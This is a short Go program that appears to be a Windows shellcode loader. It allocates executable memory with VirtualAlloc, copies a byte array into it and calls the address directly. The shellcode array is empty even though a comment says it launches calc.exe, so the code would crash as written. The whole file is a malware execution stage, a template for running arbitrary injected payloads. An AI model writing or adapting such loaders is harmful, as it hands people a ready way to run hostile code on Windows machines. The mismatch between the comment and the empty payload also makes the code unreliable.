package main

import (
    "fmt"
    "syscall"
    "unsafe"
)

var (
    kernel32      = syscall.NewLazyDLL("kernel32.dll")
    VirtualAlloc  = kernel32.NewProc("VirtualAlloc")
    RtlCopyMemory = kernel32.NewProc("RtlMoveMemory")
)

func main() {
    // Shellcode to launch calc.exe on a 64-bit Windows system
    shellcode :=  []byte{};



    // Allocate memory for the shellcode with EXECUTE_READWRITE permissions
    addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), 0x3000, 0x40)
    if addr == 0 {
        fmt.Println("Memory allocation failed:", err)
        return
    }
    fmt.Printf("Allocated memory address: 0x%x\n", addr)

    // Copy the shellcode to the allocated memory
    _, _, err = RtlCopyMemory.Call(addr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
    if err != nil && err.Error() != "The operation completed successfully." {
        fmt.Println("Failed to copy shellcode:", err)
        return
    }
    // Execute the shellcode by calling the memory address directly
    syscall.Syscall(addr, 0, 0, 0, 0)
}
